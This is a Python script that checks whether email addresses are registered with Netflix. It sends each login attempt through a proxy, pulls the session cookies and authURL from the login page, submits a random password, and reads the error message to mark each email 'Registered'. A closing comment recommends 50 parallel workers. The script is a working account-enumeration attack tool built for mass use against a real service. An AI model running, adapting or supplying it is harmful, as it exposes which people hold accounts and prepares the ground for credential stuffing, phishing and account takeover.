import requests
import logging
from random import choice

from shared.proxy import Proxy
from scripts.Netflix.NetflixConfig import *


class Checker:
    def __init__(self,email):
        self.email = email
        self.error_count = 0
        self.check()

    def check(self):
        self.result = ()
        self.skipped = () 
        while True:
            try:
                self.send_requests()      
                break
            except Exception as exc:
                self.error_count+=1
                if self.error_count>5:
                    logging.error((self.email,exc))
                    self.skipped = ((self.email,exc))
                    break
        self.response = (self.result,self.skipped)
        
    def send_requests(self):
        with requests.Session() as s:
            s.proxies.update(Proxy)
            s.headers.update(headers_main)

            resp = s.get(url_main,timeout=10)

            authURL = (resp.text).split('name="authURL" value="')[1].split('"')[0]
            SecureNetflixId = s.cookies["SecureNetflixId"]
            NetflixId = s.cookies["NetflixId"]
            nfvdid = s.cookies["nfvdid"]
            password = (''.join([choice('abcdefghijklmnopqrstuvwxyz0123456789%^*(-_=+)') for i in range(10)]))
            payload_formated = format_payload(self.email,password,authURL,payload)

            s.cookies.clear()
            s.cookies.set('SecureNetflixId', SecureNetflixId, domain=".netflix.com")
            s.cookies.set('NetflixId', NetflixId, domain=".netflix.com")
            s.cookies.set('nfvdid', nfvdid, domain=".netflix.com")

            s.headers.update(headers_post)
            r = s.post(url_main,data=payload_formated,timeout=10)

            if "Incorrect password" in r.text:
                self.result = ((self.email,"Registered"))

            elif "Sorry, the password for this account needs to be reset" in r.text:
                self.result = ((self.email,"Registered"))

            elif "We are having technical difficulties and are actively working on a fix" in r.text:
                raise Exception("Tech Difficulties")

                
#best max_workers - 50